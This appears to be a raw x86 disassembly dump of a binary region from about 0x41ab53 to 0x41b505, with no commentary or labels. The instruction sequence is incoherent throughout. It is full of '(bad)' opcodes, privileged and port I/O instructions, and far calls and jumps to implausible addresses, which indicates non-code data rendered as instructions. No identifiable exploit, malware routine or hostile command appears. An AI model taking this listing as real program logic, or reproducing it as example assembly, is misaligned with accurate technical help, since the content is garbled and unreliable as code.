  41ab53:	inc    eax
  41ab54:	int3   
  41ab55:	jecxz  0x41ab00
  41ab57:	call   0xc9d39fbf
  41ab5c:	fcom   DWORD PTR [ecx-0x53]
  41ab5f:	cmp    BYTE PTR [ecx+0x7b],0x37
  41ab63:	pop    ecx
  41ab64:	pushf  
  41ab65:	cmp    BYTE PTR [ecx+0xb577c74],bh
  41ab6b:	sbb    eax,0x789dccbc
  41ab70:	and    DWORD PTR [edx-0x28],edi
  41ab73:	ror    BYTE PTR [ebx-0x43],cl
  41ab76:	ss mov cl,0xb7
  41ab79:	cmp    BYTE PTR [ebp-0x44cdc84c],dh
  41ab7f:	xchg   BYTE PTR [ecx+0x63195b09],bh
  41ab85:	dec    eax
  41ab86:	mov    edx,0x6fed34b1
  41ab8b:	test   eax,0x40d612a5
  41ab90:	cdq    
  41ab91:	ds imul ebx,esp,0x46
  41ab95:	arpl   WORD PTR [ebx+0x22c34754],dx
  41ab9b:	and    dh,bl
  41ab9d:	mov    edi,0x9690e45
  41aba2:	stos   DWORD PTR es:[edi],eax
  41aba3:	pop    ss
  41aba4:	push   ecx
  41aba5:	arpl   WORD PTR [edx],ax
  41aba7:	xchg   ebx,eax
  41aba8:	retf   
  41aba9:	xor    BYTE PTR [ecx-0xb3a1576],ah
  41abaf:	or     dl,ch
  41abb1:	sub    dl,BYTE PTR [edx+0x25]
  41abb4:	xchg   ebx,eax
  41abb5:	stos   DWORD PTR es:[edi],eax
  41abb6:	sub    ebp,DWORD PTR [edx]
  41abb8:	mov    edi,0x8c508e94
  41abbd:	sti    
  41abbe:	(bad)  
  41abbf:	push   edi
  41abc0:	test   eax,0xd4143db8
  41abc5:	ret    
  41abc6:	out    dx,eax
  41abc7:	scas   al,BYTE PTR es:[di]
  41abc9:	adc    eax,0x1059247a
  41abce:	jae    0x41ab60
  41abd0:	sbb    ebx,DWORD PTR [ebp+0x1]
  41abd3:	xor    BYTE PTR ds:0xfa27335b,dh
  41abd9:	dec    ebx
  41abda:	dec    edx
  41abdb:	(bad)  
  41abdc:	arpl   WORD PTR [edi+0x6f1f5c4a],cx
  41abe2:	push   esp
  41abe3:	xor    esi,esi
  41abe5:	loopne 0x41ac00
  41abe7:	fst    st(2)
  41abe9:	lds    edi,FWORD PTR [ebx+0x1d]
  41abec:	mov    dl,0x8e
  41abee:	pop    es
  41abef:	popa   
  41abf0:	enter  0x5d78,0x76
  41abf4:	dec    esi
  41abf5:	add    dl,BYTE PTR [ecx]
  41abf7:	jno    0x41abd4
  41abf9:	adc    eax,0xb9ddaf6d
  41abfe:	dec    ecx
  41abff:	shl    DWORD PTR [edx],0x81
  41ac02:	shl    DWORD PTR [ecx+edi*8+0x4a],cl
  41ac06:	stos   BYTE PTR es:[edi],al
  41ac07:	hlt    
  41ac08:	mov    ?,WORD PTR [edi-0x3b]
  41ac0b:	addr16 mov ah,0xb5
  41ac0e:	cs cmp eax,0xb
	...
  41ac74:	push   0x49
  41ac76:	es cmp al,0x27
  41ac79:	jg     0x41acf5
  41ac7b:	pop    edi
  41ac7c:	or     al,0x44
  41ac7e:	xor    ah,BYTE PTR [edx+ebp*4-0x3]
  41ac82:	sbb    esp,ebp
  41ac84:	dec    ecx
  41ac85:	sbb    al,0x1
  41ac87:	add    BYTE PTR ds:0xf5000001,al
  41ac8d:	sub    cl,BYTE PTR [esi-0x31]
  41ac90:	push   esi
  41ac91:	fwait
  41ac92:	mov    eax,0x44747d47
  41ac97:	and    ch,al
  41ac99:	pop    eax
  41ac9a:	sub    bl,ch
  41ac9c:	lods   al,BYTE PTR ds:[esi]
  41ac9d:	mov    BYTE PTR [ecx+0x5d],ch
  41aca0:	iret   
  41aca1:	add    eax,0x2e6861ec
  41aca6:	ins    DWORD PTR es:[edi],dx
  41aca7:	cmp    BYTE PTR [eax-0x214f758d],dl
  41acad:	xchg   ebx,eax
  41acae:	xor    BYTE PTR [ebp-0x59],0x25
  41acb2:	sbb    eax,eax
  41acb4:	test   al,0x9c
  41acb6:	inc    ecx
  41acb7:	jmp    0x41ad29
  41acb9:	dec    esi
  41acba:	push   ds
  41acbb:	test   DWORD PTR [ebx-0x2],esi
  41acbe:	mov    dl,0xe1
  41acc0:	sub    al,ch
  41acc2:	stos   DWORD PTR es:[edi],eax
  41acc3:	mov    cl,BYTE PTR [ebp+0x525d269d]
  41acc9:	push   ebp
  41acca:	add    BYTE PTR [eax],dh
  41accc:	outs   dx,BYTE PTR ds:[esi]
  41accd:	jb     0x41ad04
  41accf:	ror    al,0x42
  41acd2:	sbb    BYTE PTR [edi+0x68],cl
  41acd5:	or     al,0x57
  41acd7:	mov    ebp,0xbe05ac6c
  41acdc:	xor    bl,BYTE PTR [edi]
  41acde:	jae    0x41ac63
  41ace0:	dec    ebp
  41ace1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ace2:	cs jecxz 0x41ad07
  41ace5:	(bad)  
  41ace6:	sub    dh,BYTE PTR [ebx+ecx*8+0x762f62aa]
  41aced:	jp     0x41ad3f
  41acef:	stos   BYTE PTR es:[edi],al
  41acf0:	int    0xfb
  41acf2:	xor    ebx,edx
  41acf4:	leave  
  41acf5:	loop   0x41ad1b
  41acf7:	lock lock repz shl DWORD PTR [edx-0x42],cl
  41acfd:	mov    ds:0xc7d63e46,eax
  41ad02:	retf   0x1526
  41ad05:	es mov al,0xc6
  41ad08:	add    al,0x51
  41ad0a:	xor    ebp,eax
  41ad0c:	fbld   TBYTE PTR [esi+eax*8-0x3ffae893]
  41ad13:	out    0xf7,eax
  41ad15:	(bad)
  41ad18:	push   ecx
  41ad19:	fucomip st,st(6)
  41ad1b:	imul   esi,DWORD PTR [edx-0x163fcc8f],0xffffffc1
  41ad22:	lods   al,BYTE PTR ds:[esi]
  41ad23:	loope  0x41ad29
  41ad25:	push   ebp
  41ad26:	mov    ah,0x32
  41ad28:	inc    esi
  41ad29:	xchg   esp,eax
  41ad2a:	jb     0x41ad52
  41ad2c:	(bad)  
  41ad2d:	scas   al,BYTE PTR es:[edi]
  41ad2e:	or     eax,0xf43bc3ef
  41ad33:	rcr    DWORD PTR [edi],0xea
  41ad36:	repz cmc 
  41ad38:	call   0x4b94b7da
  41ad3d:	push   0x8bb57e17
  41ad42:	jp     0x41acd1
  41ad44:	adc    al,0x50
  41ad46:	fidivr WORD PTR [eax]
  41ad48:	std    
  41ad49:	shl    BYTE PTR [edi],cl
  41ad4b:	sub    bh,BYTE PTR [ebx+0x58]
  41ad4e:	pop    ecx
  41ad4f:	cmp    al,0xb4
  41ad51:	mov    esp,0xcbc8502f
  41ad56:	je     0x41add2
  41ad58:	dec    esi
  41ad59:	mov    esp,0xbcd5f62d
  41ad5e:	(bad)  
  41ad5f:	xlat   BYTE PTR ds:[ebx]
  41ad60:	adc    BYTE PTR [esi-0x234db289],bh
  41ad66:	or     DWORD PTR [ecx+0x2c],ebx
  41ad69:	retf   
  41ad6a:	mov    eax,0xcd2d0be2
  41ad6f:	mov    eax,0xded15c9c
  41ad74:	jmp    0x41ad07
  41ad76:	add    bh,BYTE PTR [eax+0x7993aecb]
  41ad7c:	idiv   BYTE PTR [edi+ecx*8-0x42]
  41ad80:	mov    dh,0xdb
  41ad82:	lods   al,BYTE PTR ds:[esi]
  41ad83:	out    dx,eax
  41ad84:	jmp    0x7cc1:0x9f350c42
  41ad8b:	fcomp  DWORD PTR [edi+0x57]
  41ad8e:	int3   
  41ad8f:	dec    esp
  41ad90:	cmp    eax,DWORD PTR [eax]
	...
  41adf2:	add    BYTE PTR [eax],al
  41adf4:	push   ebp
  41adf5:	clc    
  41adf6:	or     DWORD PTR [esi-0x4280053],ebx
  41adfc:	dec    edi
  41adfd:	push   eax
  41adfe:	cmp    DWORD PTR [edi+ebx*4+0x4e65af3c],esp
  41ae05:	sbb    eax,0x1050001
  41ae0a:	add    BYTE PTR [eax],al
  41ae0c:	in     eax,dx
  41ae0d:	cmp    al,0x2e
  41ae0f:	jmp    0x41ae19
  41ae11:	or     ah,bl
  41ae13:	shr    DWORD PTR ds:0x3e43,0xb9
  41ae19:	sub    al,0xa8
  41ae1b:	call   FWORD PTR [eax-0x3]
  41ae1e:	push   ebx
  41ae1f:	mov    cs,ebp
  41ae21:	adc    DWORD PTR [ebx+0x76820acc],eax
  41ae27:	sub    al,0xae
  41ae29:	in     eax,dx
  41ae2a:	xlat   BYTE PTR ds:[ebx]
  41ae2b:	pop    edi
  41ae2c:	push   cs
  41ae2d:	loop   0x41ae51
  41ae2f:	fs sub dh,dh
  41ae32:	cmp    al,0xf3
  41ae34:	sbb    BYTE PTR [eax-0x6cafbaae],bl
  41ae3a:	imul   ecx,DWORD PTR [esi+0x5b],0xf75ed29d
  41ae41:	adc    ebx,0x21
  41ae44:	jne    0x41ae3d
  41ae46:	cmp    ebx,DWORD PTR [ecx]
  41ae48:	jge    0x41ae70
  41ae4a:	and    bh,dl
  41ae4c:	pop    ecx
  41ae4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae4e:	or     al,BYTE PTR [esi-0x21b3902d]
  41ae54:	and    DWORD PTR [ebx+0x70],0x58845482
  41ae5b:	mov    DWORD PTR [esi-0x64],eax
  41ae5e:	pop    eax
  41ae5f:	add    ecx,DWORD PTR [ecx]
  41ae61:	addr16 ret 
  41ae63:	push   es
  41ae64:	into   
  41ae65:	xor    BYTE PTR [ebp+0x6efb5877],al
  41ae6b:	test   dh,dh
  41ae6d:	(bad)  
  41ae6e:	loope  0x41aede
  41ae70:	mov    ah,0xde
  41ae72:	in     al,0x3
  41ae74:	into   
  41ae75:	mov    ah,0x34
  41ae77:	aaa    
  41ae78:	jne    0x41aed2
  41ae7a:	shl    BYTE PTR [esi+0x4bd5b12],cl
  41ae80:	leave  
  41ae81:	not    BYTE PTR [ecx+0x1]
  41ae84:	adc    eax,0xf3c17a3a
  41ae89:	sub    DWORD PTR [ebx+0x31c47f5d],ebp
  41ae8f:	xchg   ecx,eax
  41ae90:	cmp    eax,0xafff72e4
  41ae95:	cmp    DWORD PTR ds:0x1dad3107,edi
  41ae9b:	sahf   
  41ae9c:	pop    ebx
  41ae9d:	ficomp WORD PTR [edi+0x78]
  41aea0:	rol    edx,1
  41aea2:	sbb    DWORD PTR ss:[eax+0x403bfb53],esi
  41aea9:	sub    eax,0x5bd0c90a
  41aeae:	mov    ch,0x57
  41aeb0:	imul   eax,DWORD PTR [eax-0x15],0xf82874f6
  41aeb7:	rcr    BYTE PTR [ecx-0x28228679],0x0
  41aebe:	shl    DWORD PTR [edi+esi*8],0x2b
  41aec2:	outs   dx,DWORD PTR ds:[esi]
  41aec3:	test   al,0x6e
  41aec5:	les    ebx,FWORD PTR [ebx+0x3dd45f05]
  41aecb:	add    eax,0xf6828afa
  41aed0:	(bad)  
  41aed1:	mov    cl,0x7c
  41aed3:	mov    ch,0xbe
  41aed5:	dec    ebx
  41aed6:	xchg   DWORD PTR [eax+0x1b9cf721],edi
  41aedc:	adc    al,BYTE PTR [eax-0x3af2bfac]
  41aee2:	pop    esi
  41aee3:	jl     0x41ae6d
  41aee5:	adc    al,0xfa
  41aee7:	push   edx
  41aee8:	mov    ah,0x36
  41aeea:	adc    al,0x7
  41aeec:	fsub   DWORD PTR [ebp-0x1c]
  41aeef:	into   
  41aef0:	mov    esp,0xe7910228
  41aef5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aef6:	dec    esp
  41aef7:	xor    eax,esi
  41aef9:	jmp    0x49035c26
  41aefe:	dec    esi
  41aeff:	popa   
  41af00:	fist   DWORD PTR [edi+0x6d8c6228]
  41af06:	pop    ebp
  41af07:	push   ebx
  41af08:	pop    DWORD PTR [esi-0xd199ed]
  41af0e:	out    dx,eax
  41af0f:	loop   0x41af3b
	...
  41af71:	add    BYTE PTR [eax],al
  41af73:	add    ch,al
  41af75:	stc    
  41af76:	lods   eax,DWORD PTR ds:[esi]
  41af77:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41af7d:	mov    ecx,0x59ea44ee
  41af82:	xor    ecx,eax
  41af84:	push   ebx
  41af85:	push   ds
  41af86:	add    DWORD PTR [eax],eax
  41af88:	add    eax,0xc2000001
  41af8d:	and    eax,0x36d02715
  41af92:	cs xor al,0x75
  41af95:	cs ss mov bh,0x66
  41af99:	xchg   dh,dh
  41af9b:	cmp    al,0x19
  41af9d:	repz sahf 
  41af9f:	(bad)  
  41afa0:	lock add DWORD PTR ds:0xbaa7de84,ebx
  41afa7:	call   0x93e38427
  41afac:	sub    eax,0xd2e65cf9
  41afb1:	retf   
  41afb2:	push   ebx
  41afb3:	mov    ecx,0x4043f80a
  41afb8:	add    eax,0xf2054609
  41afbd:	lock les ebp,FWORD PTR [edi]
  41afc0:	jbe    0x41affe
  41afc2:	adc    DWORD PTR [ebx],ebp
  41afc4:	adc    BYTE PTR [edi],ch
  41afc6:	sub    bl,BYTE PTR [ebx]
  41afc8:	pusha  
  41afc9:	inc    esi
  41afca:	(bad)  
  41afcb:	mov    al,0x1d
  41afcd:	mov    al,dl
  41afcf:	sub    al,0x58
  41afd1:	mov    ebp,0xb8372a08
  41afd6:	pushf  
  41afd7:	in     eax,0x53
  41afd9:	xchg   esi,eax
  41afda:	sub    DWORD PTR [ebx-0x31],esi
  41afdd:	sbb    eax,0x9b43616e
  41afe2:	pop    ss
  41afe3:	push   ds
  41afe4:	xchg   ebp,eax
  41afe5:	lahf   
  41afe6:	xchg   esi,eax
  41afe7:	mov    al,0xfa
  41afe9:	push   ebx
  41afea:	pop    ebp
  41afeb:	mov    bh,0xc8
  41afed:	and    DWORD PTR [edx-0x530954c],0x2e502464
  41aff7:	add    bh,ah
  41aff9:	sbb    cl,bl
  41affb:	retf   0xa8df
  41affe:	loope  0x41b02a
  41b000:	mov    esp,0x2bf0b33f
  41b005:	popf   
  41b006:	and    bh,BYTE PTR [ebx+0x22]
  41b009:	inc    edx
  41b00a:	cmp    cl,ah
  41b00c:	ins    BYTE PTR es:[edi],dx
  41b00d:	in     eax,dx
  41b00e:	call   0x9552b7cb
  41b013:	outs   dx,BYTE PTR ds:[esi]
  41b014:	imul   edi,DWORD PTR [ebx+ebx*1],0xfffffffd
  41b018:	pop    ecx
  41b019:	lea    edx,[ebx+0x35]
  41b01c:	jmp    0x41afaf
  41b01e:	hlt    
  41b01f:	aaa    
  41b020:	mov    ecx,0x27bf8419
  41b025:	retf   0xfc71
  41b028:	mov    eax,ds:0x8e549346
  41b02d:	jne    0x41affe
  41b02f:	push   eax
  41b030:	popf   
  41b031:	inc    esi
  41b032:	xor    esi,DWORD PTR [ecx]
  41b034:	nop
  41b035:	(bad)  
  41b037:	jmp    FWORD PTR [ecx+0x49]
  41b03a:	sbb    edx,ebp
  41b03c:	mov    bh,0x2c
  41b03e:	mov    cl,0xa1
  41b040:	jae    0x41b02e
  41b042:	dec    edx
  41b043:	mov    eax,ds:0xa3f4ae1f
  41b048:	xor    BYTE PTR [edx+esi*4+0x53],bl
  41b04c:	out    dx,al
  41b04d:	xchg   esi,eax
  41b04e:	adc    ebx,ebp
  41b050:	out    dx,eax
  41b051:	pop    ebp
  41b052:	cmp    DWORD PTR [esi+edx*2],ecx
  41b055:	mov    edx,0xc603a025
  41b05a:	sbb    edx,DWORD PTR [esi+0x2c]
  41b05d:	or     eax,0x5a746e5d
  41b062:	adc    eax,0x7438dceb
  41b067:	rcr    BYTE PTR [edx-0x1c],cl
  41b06a:	add    al,0x57
  41b06c:	sub    BYTE PTR [ebx],ah
  41b06e:	mov    ah,0xa4
  41b070:	je     0x41b006
  41b072:	jge    0x41b09d
  41b074:	xlat   BYTE PTR ds:[ebx]
  41b075:	ret    0xe233
  41b078:	bnd jge 0x41b03f
  41b07b:	push   esi
  41b07c:	jnp    0x41b0ad
  41b07e:	dec    eax
  41b07f:	jl     0x41b05f
  41b081:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b082:	out    0xda,eax
  41b084:	inc    ebx
  41b085:	das    
  41b086:	or     BYTE PTR [eax+0x7576e93b],bh
  41b08c:	call   FWORD PTR [ebx+0x8f0c50]
	...
  41b0f2:	add    BYTE PTR [eax],al
  41b0f4:	(bad)  
  41b0f5:	ficom  WORD PTR [eax]
  41b0f7:	stos   DWORD PTR es:[edi],eax
  41b0f8:	sbb    bh,ch
  41b0fa:	(bad)  
  41b0fb:	call   DWORD PTR [edx+edx*8+0x75]
  41b0ff:	mov    edi,0x7395a2a1
  41b104:	pop    eax
  41b105:	pop    ds
  41b106:	add    DWORD PTR [eax],eax
  41b108:	add    eax,0x19000001
  41b10d:	popa   
  41b10e:	pop    di
  41b110:	mov    dh,BYTE PTR [ecx+0x12]
  41b113:	dec    ebx
  41b114:	or     ah,bh
  41b116:	cs cwde 
  41b118:	in     al,dx
  41b119:	or     ah,bh
  41b11b:	jl     0x41b114
  41b11d:	int3   
  41b11e:	gs cmp al,0x7b
  41b121:	into   
  41b122:	(bad)  
  41b123:	cmp    eax,0x722435a4
  41b128:	test   al,0x88
  41b12a:	iret   
  41b12b:	dec    ebx
  41b12c:	out    0x22,al
  41b12e:	loopne 0x41b1a6
  41b130:	pop    edx
  41b131:	inc    edi
  41b132:	add    ebp,0xc5a22085
  41b138:	xchg   esp,eax
  41b139:	and    BYTE PTR [ebx-0x12e3b1f1],cl
  41b13f:	mov    esi,0x2f5cd48d
  41b144:	fiadd  DWORD PTR [ebx+0x9]
  41b147:	sar    DWORD PTR [edx],1
  41b149:	sub    BYTE PTR [ecx+0x2f],ch
  41b14c:	das    
  41b14d:	fisub  DWORD PTR [edi]
  41b14f:	xchg   edx,eax
  41b150:	(bad)  
  41b151:	loopne 0x41b0ef
  41b153:	add    al,0x91
  41b155:	call   0xd116ea9
  41b15a:	cmp    eax,0x2dd968ae
  41b15f:	sub    bh,bh
  41b161:	jmp    0x41b103
  41b163:	out    dx,al
  41b164:	sbb    al,0xf6
  41b166:	sub    ah,BYTE PTR [edi]
  41b168:	rcl    DWORD PTR [edx+eiz*1+0x0],cl
  41b16c:	cwde   
  41b16d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b16e:	shr    BYTE PTR [ebx],cl
  41b170:	ror    bh,1
  41b172:	fs pop ecx
  41b174:	mov    al,0xb4
  41b176:	cmp    ebp,DWORD PTR [ecx+0x4d658b6]
  41b17c:	jecxz  0x41b1fd
  41b17e:	aad    0x92
  41b180:	cmp    al,0xf3
  41b182:	(bad)  
  41b183:	jbe    0x41b1c6
  41b185:	pop    edx
  41b186:	mov    ebp,DWORD PTR [edx]
  41b188:	pop    DWORD PTR [ecx+0x85e6db3]
  41b18e:	sbb    bh,BYTE PTR [ebp+0xc]
  41b191:	pop    edi
  41b192:	jns    0x41b1d1
  41b194:	loopne 0x41b183
  41b196:	xor    eax,0xb7bc4593
  41b19b:	call   0x17ddff27
  41b1a0:	loop   0x41b173
  41b1a2:	es push es
  41b1a4:	lock call 0x5840:0xa9616055
  41b1ac:	xchg   ebp,eax
  41b1ad:	nop
  41b1ae:	pop    esp
  41b1af:	stos   DWORD PTR es:[edi],eax
  41b1b0:	add    DWORD PTR [esi+0x70207f96],eax
  41b1b6:	jecxz  0x41b1e4
  41b1b8:	jne    0x41b1b8
  41b1ba:	retf   
  41b1bb:	add    BYTE PTR [edx+0x56467f9],dl
  41b1c1:	jg     0x41b17b
  41b1c3:	leave  
  41b1c4:	fxch   st(6)
  41b1c6:	xor    eax,0xd11c3759
  41b1cb:	xchg   esp,eax
  41b1cc:	adc    BYTE PTR fs:[ecx-0x4a720123],cl
  41b1d3:	jp     0x41b1c0
  41b1d5:	lahf   
  41b1d6:	stos   BYTE PTR es:[edi],al
  41b1d7:	leave  
  41b1d8:	sub    eax,0x4db6f2da
  41b1dd:	dec    ebp
  41b1de:	add    ebx,DWORD PTR [eax+0x34a3a705]
  41b1e4:	mov    ebx,0xadb40e53
  41b1e9:	clc    
  41b1ea:	je     0x41b264
  41b1ec:	jge    0x41b18a
  41b1ee:	mov    ds:0x3165c836,al
  41b1f3:	daa    
  41b1f4:	out    0x57,eax
  41b1f6:	cwde   
  41b1f7:	and    al,0x8
  41b1f9:	push   eax
  41b1fa:	push   ds
  41b1fb:	mov    eax,0x8bf255c0
  41b200:	mov    ds:0xb8264876,al
  41b205:	push   cs
  41b206:	mov    ebx,0xb01801f4
  41b20b:	mov    ds:0xc56b710b,al
  41b210:	test   al,0x0
	...
  41b272:	add    BYTE PTR [eax],al
  41b274:	mov    fs,WORD PTR [ebp-0x13941f97]
  41b27a:	(bad)  
  41b27b:	out    dx,eax
  41b27c:	stos   BYTE PTR es:[edi],al
  41b27d:	jge    0x41b21a
  41b27f:	or     BYTE PTR [ebp+0x5d051d26],bh
  41b285:	and    BYTE PTR [ecx],al
  41b287:	add    BYTE PTR ds:0xe2000001,al
  41b28d:	xchg   edi,eax
  41b28e:	dec    edx
  41b28f:	pop    es
  41b290:	push   ebp
  41b291:	dec    eax
  41b292:	inc    esp
  41b293:	ins    BYTE PTR es:[edi],dx
  41b294:	mov    ds:0xd9c47ae5,al
  41b299:	hlt    
  41b29a:	in     eax,0xdc
  41b29c:	and    eax,0xef381038
  41b2a1:	mov    BYTE PTR [ecx],ch
  41b2a3:	aas    
  41b2a4:	mov    dl,0x86
  41b2a6:	sti    
  41b2a7:	jbe    0x41b2f2
  41b2a9:	push   ebp
  41b2aa:	xchg   esp,eax
  41b2ab:	mov    ecx,0x148f5424
  41b2b0:	xchg   edx,eax
  41b2b1:	mov    ds:0x20ab31fb,al
  41b2b6:	je     0x41b29c
  41b2b8:	mov    eax,0x946fde27
  41b2bd:	into   
  41b2be:	je     0x41b2ec
  41b2c0:	test   DWORD PTR [esi-0x49],ecx
  41b2c3:	jno    0x41b316
  41b2c5:	add    edx,0x70
  41b2c8:	lods   al,BYTE PTR ds:[esi]
  41b2c9:	in     eax,dx
  41b2ca:	dec    esi
  41b2cb:	out    0x6f,eax
  41b2cd:	nop
  41b2ce:	jmp    0x41b29d
  41b2d0:	dec    esi
  41b2d1:	ins    DWORD PTR es:[edi],dx
  41b2d2:	cs cmp dh,ch
  41b2d5:	bnd je 0x41b25a
  41b2d8:	lahf   
  41b2d9:	xchg   edi,eax
  41b2da:	adc    dl,BYTE PTR [eax+0x4b914063]
  41b2e0:	lahf   
  41b2e1:	js     0x41b2ef
  41b2e3:	dec    ebx
  41b2e4:	jge    0x41b287
  41b2e6:	and    ecx,esi
  41b2e8:	or     cl,BYTE PTR fs:[edi+0x4e]
  41b2ec:	xchg   edi,esp
  41b2ee:	loope  0x41b2f1
  41b2f0:	jae    0x41b354
  41b2f2:	aaa    
  41b2f3:	add    ecx,DWORD PTR [edx+ebp*8-0x7d]
  41b2f7:	dec    eax
  41b2f8:	xchg   ebp,eax
  41b2f9:	repz xor ch,BYTE PTR [eax]
  41b2fc:	mov    esp,0x2fe9075a
  41b301:	push   ecx
  41b302:	aaa    
  41b303:	push   ebp
  41b304:	sbb    edi,DWORD PTR [esi+0x12]
  41b307:	add    al,0x4c
  41b309:	aad    0x4
  41b30b:	xchg   ebx,eax
  41b30c:	shr    DWORD PTR [edx+0x625609ee],1
  41b312:	lock jmp 0x8570b0c1
  41b318:	sbb    BYTE PTR [ecx-0x1474b78d],bl
  41b31e:	mov    eax,ds:0x1f7b0569
  41b323:	xchg   edx,eax
  41b324:	jmp    0x41b2db
  41b326:	lods   al,BYTE PTR ds:[esi]
  41b327:	repz cs popf 
  41b32a:	int3   
  41b32b:	xlat   BYTE PTR ds:[ebx]
  41b32c:	aad    0xd5
  41b32e:	pushf  
  41b32f:	sbb    BYTE PTR [ecx+0x7a],ch
  41b332:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b333:	lods   al,BYTE PTR ds:[esi]
  41b334:	jns    0x41b2f1
  41b336:	shl    DWORD PTR [edx+0x4b],1
  41b339:	ss in  eax,0xe3
  41b33c:	mov    DWORD PTR [edx+eiz*1],esi
  41b33f:	or     cl,BYTE PTR [ebx+0x23]
  41b342:	jl     0x41b3b7
  41b344:	push   es
  41b345:	push   0x22279bb8
  41b34a:	jae    0x41b31d
  41b34c:	ds retf 0x9550
  41b350:	xor    eax,0xcb582f93
  41b355:	sar    BYTE PTR [ebp+0x6795abc8],0x80
  41b35c:	int    0x4a
  41b35e:	push   edi
  41b35f:	or     DWORD PTR [edi],ebp
  41b361:	xchg   edi,eax
  41b362:	nop
  41b363:	mov    dh,0xa5
  41b365:	inc    esi
  41b366:	arpl   WORD PTR [edx-0x46],sp
  41b369:	sub    al,0xbe
  41b36b:	fst    DWORD PTR [eax]
  41b36d:	mov    edi,0x72f59208
  41b372:	ds dec esi
  41b374:	mov    DWORD PTR [ecx],edi
  41b376:	adc    DWORD PTR ss:[esi-0x5124f6b5],ebx
  41b37d:	push   ecx
  41b37e:	mov    edx,0xb7b079d2
  41b383:	jmp    0x274172d0
  41b388:	int3   
  41b389:	imul   esi,DWORD PTR [esi+0x4],0xc4b11f20
  41b390:	inc    eax
	...
  41b3f1:	add    BYTE PTR [eax],al
  41b3f3:	add    BYTE PTR [eax+0xd],cl
  41b3f6:	sbb    eax,0xfebb5dab
  41b3fb:	out    dx,eax
  41b3fc:	xchg   ebp,eax
  41b3fd:	iret   
  41b3fe:	push   ebx
  41b3ff:	aas    
  41b400:	pop    eax
  41b401:	mov    esi,0x2162e67b
  41b406:	add    DWORD PTR [eax],eax
  41b408:	add    eax,0x5d000001
  41b40d:	arpl   si,si
  41b40f:	inc    edi
  41b410:	adc    ebx,ebp
  41b412:	add    BYTE PTR [ebx+edx*2+0x722a8f09],0xb6
  41b41a:	add    ah,ah
  41b41c:	mov    ds:0x3df63f39,eax
  41b421:	popf   
  41b422:	cmp    ch,BYTE PTR [eax-0x7c44a4a8]
  41b428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b429:	icebp  
  41b42a:	das    
  41b42b:	ds push esi
  41b42d:	jmp    0x1582:0xff4d9b3b
  41b434:	rcl    BYTE PTR [eax+edi*8-0x2790708d],cl
  41b43b:	xchg   edx,eax
  41b43c:	in     al,0xbc
  41b43e:	mov    dh,0x21
  41b440:	rcr    DWORD PTR [ecx-0x50186415],cl
  41b446:	mov    cl,0x5f
  41b448:	lods   al,BYTE PTR ds:[esi]
  41b449:	icebp  
  41b44a:	cvtps2pi mm7,QWORD PTR [ebp-0x25]
  41b44e:	das    
  41b44f:	or     BYTE PTR [edx-0x4f],bl
  41b452:	push   ebx
  41b453:	add    eax,DWORD PTR [eax+ebp*2]
  41b456:	loopne 0x41b464
  41b458:	xor    eax,0xfec9ebaa
  41b45d:	cmp    BYTE PTR [edx],cl
  41b45f:	mov    al,0x10
  41b461:	or     bl,dh
  41b463:	test   eax,0x26bd1246
  41b468:	in     eax,0x85
  41b46a:	mov    bh,0xcd
  41b46c:	jne    0x41b49f
  41b46e:	inc    esp
  41b46f:	sub    dh,al
  41b471:	inc    ecx
  41b472:	adc    BYTE PTR [ecx-0x79],ch
  41b475:	mov    esp,0x61115cbe
  41b47a:	inc    ebx
  41b47b:	js     0x41b4af
  41b47d:	lods   al,BYTE PTR ds:[esi]
  41b47e:	test   al,0x72
  41b480:	gs enter 0x23ae,0x7f
  41b485:	inc    edi
  41b486:	hlt    
  41b487:	xor    ch,BYTE PTR [ebx]
  41b489:	mov    ch,0xf7
  41b48b:	pop    esi
  41b48c:	pop    ecx
  41b48d:	jne    0x41b432
  41b48f:	cmp    eax,0xb811c786
  41b494:	xchg   edi,eax
  41b495:	cmp    al,0x57
  41b497:	or     al,0xae
  41b499:	inc    edx
  41b49a:	jbe    0x41b514
  41b49c:	push   eax
  41b49d:	jecxz  0x41b4fe
  41b49f:	inc    edi
  41b4a0:	sub    bh,BYTE PTR [ecx]
  41b4a2:	mov    WORD PTR [ebx+0x54],?
  41b4a5:	stos   BYTE PTR es:[edi],al
  41b4a6:	and    eax,0x98ed3f6c
  41b4ab:	stos   DWORD PTR es:[edi],eax
  41b4ac:	(bad)  
  41b4ad:	adc    al,0x6f
  41b4af:	fstp   DWORD PTR [edi]
  41b4b1:	cmp    esp,DWORD PTR [ebx+0x20]
  41b4b4:	sub    al,0x73
  41b4b6:	adc    dh,BYTE PTR [esi+0x7e3b04ea]
  41b4bc:	shl    BYTE PTR [ebx-0x4e],cl
  41b4bf:	loopne 0x41b465
  41b4c1:	jle    0x41b527
  41b4c3:	icebp  
  41b4c4:	mov    al,0x30
  41b4c6:	out    dx,al
  41b4c7:	inc    ebp
  41b4c8:	pop    edi
  41b4c9:	cs sub edi,eax
  41b4cc:	lahf   
  41b4cd:	xchg   ebx,eax
  41b4ce:	call   0x11a87111
  41b4d3:	cmp    BYTE PTR [edx],bl
  41b4d5:	enter  0xd590,0xc4
  41b4d9:	inc    eax
  41b4da:	call   0xa42f:0xc912dba2
  41b4e1:	ficomp DWORD PTR [ebp-0x35]
  41b4e4:	dec    ebx
  41b4e5:	ja     0x41b4d6
  41b4e7:	push   ebp
  41b4e8:	outs   dx,BYTE PTR ds:[esi]
  41b4e9:	enter  0x4ca7,0x59
  41b4ed:	pushf  
  41b4ee:	xchg   ebp,edi
  41b4f0:	mov    cl,0x57
  41b4f2:	dec    ecx
  41b4f3:	scas   al,BYTE PTR es:[edi]
  41b4f4:	imul   ebp,ecx,0xffffffad
  41b4f7:	mov    BYTE PTR [eax],bl
  41b4f9:	sbb    BYTE PTR [ebx],dl
  41b4fb:	lods   eax,DWORD PTR ds:[esi]
  41b4fc:	mov    al,0xdb
  41b4fe:	fimul  WORD PTR [edx-0x27]
  41b501:	xor    al,BYTE PTR [ebp+0x43]
  41b504:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b505:	sbb    al,0x4a
